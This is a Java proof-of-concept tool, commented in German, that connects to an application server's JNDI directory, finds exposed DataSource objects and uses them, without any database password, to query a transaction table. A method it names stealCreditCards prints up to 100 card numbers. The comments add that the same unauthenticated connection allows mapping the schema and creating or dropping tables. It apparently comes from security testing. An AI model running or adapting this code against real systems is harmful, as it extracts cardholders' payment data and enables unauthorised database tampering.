package jndi;

import utils.*;
import function.*;
import java.util.*;
import javax.naming.*;
import javax.sql.*;
import java.lang.reflect.*;

public class DumpContext {
	
	private static void usage () {
		String usage = 	"usage: [jre] jndi.DumpContext \n"+
				"\t -initialFactory <java.naming.factory.initial>\n"+
				"\t -url <java.naming.provider.url>";
		System.err.println (usage);
		System.exit(1);
	}
	
	private static String initFac;
	private static String url;

	
	public static void main (String [] args) {
		
/* URL und Initialfactory von der Kommandozeile uebernehmen. */
		handleCmdLine (args);
		
		
		try {

/* JNDI Context vorbereiten und erstellen */
			Context ctx=getIntialContext(); 

/* 
 * Der Context liefert eine Aufzaehlung aller Namen, welche von diesem
 * Directory Dienst verwaltet werden.
 */
			for (NamingEnumeration enum=ctx.list(ctx.getNameInNamespace());enum.hasMore(); ) {
				
				Object obj_ncp = enum.next();
				NameClassPair ncp = (NameClassPair)obj_ncp;			
				Object obj_obj = null;
				
/* 
 * Um unoetige Muehen und Terminalausgaben zu sparen, betrachten wir nur
 * Objekte, deren Namen den String "DataSource" enthaelt. Natuerlich
 * muessen DataSource Objekt nicht so heissen, aber in dem Fall von WLP
 * ist dies praktischerweise der Fall.
 */
 
				if (ncp.getName().indexOf("DataSource")!=-1){
					System.out.println("\n\nObject:>"+obj_ncp+"<");	
					obj_obj = ctx.lookup(ncp.getName());
					System.out.println("looked up: "+ncp.getName()+" got:\n "+obj_obj.getClass()+" : "+obj_obj);
					System.out.println ("isDataSource? "+(obj_obj instanceof javax.sql.DataSource));
					
				}
				else 
					continue;

/* 
 * Ueberpruefen, ob das Objekt wirklich ein sql.DataSource ist, oder nur
 * so heisst.
 */
				if (obj_obj instanceof javax.sql.DataSource) {
/*
 * Diese provokant benannte Methode gibt einfach die ersten 100 PANs
 * aus der TXN Tabelle aus, um zu demonstrieren, dass man ohne
 * DB-Passwort mit dieser Methode uneingeschraenkten Zugriff auf die
 * Datenbank hat.
 * Selbst ohne Kenntnisse ueber das DB-Schema, kann man sich von hieraus
 * mit java DB-Metadata, bzw. Oracle Data Dictionary weiterhangeln. Es
 * ist ueber diese Verbindung sogar moeglich Tabellen anzulegen und
 * zu droppen.
 */
					stealCreditCards ((DataSource)obj_obj);
					break;
				}


/*
 * Auch andere Objekte ausser sql.DataSource's koennten von Interesse
 * sein, da sie ja in Java praktischerweise ihre Bedienungsanleitung
 * direkt mitliefern. 
 */
 
/*
				Class[] arr = obj.getClass().getInterfaces();
				System.out.println("Interfaces: \n");
				for (int i=0; i!=arr.length; ++i) {
					System.out.println(arr[i]);
					
				}
				System.out.println("Fields\n");
				Field [] arrf = obj.getClass().getFields();
				for (int i=0; i!=arrf.length; ++i){
					System.out.println(arrf[i]);	
				}
				
				System.out.println("Methods\n");
				Method [] arrm = obj.getClass().getMethods();
				for (int i=0; i!=arrm.length; ++i){
					System.out.println(arrm[i]);	
				}
*/
			}
		} catch (Throwable t) {
			t.printStackTrace();	
		}

	}
	
	/*
	 * Utility, intialFactory und url aus der Kommandozeile
	 * auslesen.
	 */
	
	static void handleCmdLine (String [] args) {
		CmdLine cmd = new CmdLine (args);
		initFac = cmd.get("-initialFactory");
		url = cmd.get ("-url");
		if (initFac == null || url == null)
			usage();
	}

	/* Context Erzeugung. */
	static Context getIntialContext () throws javax.naming.NamingException {
		Hashtable ht = new Hashtable();
		ht.put(Context.INITIAL_CONTEXT_FACTORY,initFac);
		ht.put(Context.PROVIDER_URL,url);
		return new InitialContext(ht);
	}
	
	/* DB Zugriff */
	
	static void stealCreditCards (DataSource ds) {
	
		SQLExecuter sql = new SQLExecuter (ds);
		sql.executeEachRowAsArray("select CARD_NBR from txn where rownum < 100", new SafeFunction () {
			public void apply (Object obj) {
				String [] strArr = (String[])obj;
				System.out.println(strArr[0]);	
			}	
		});
		
	} 

}
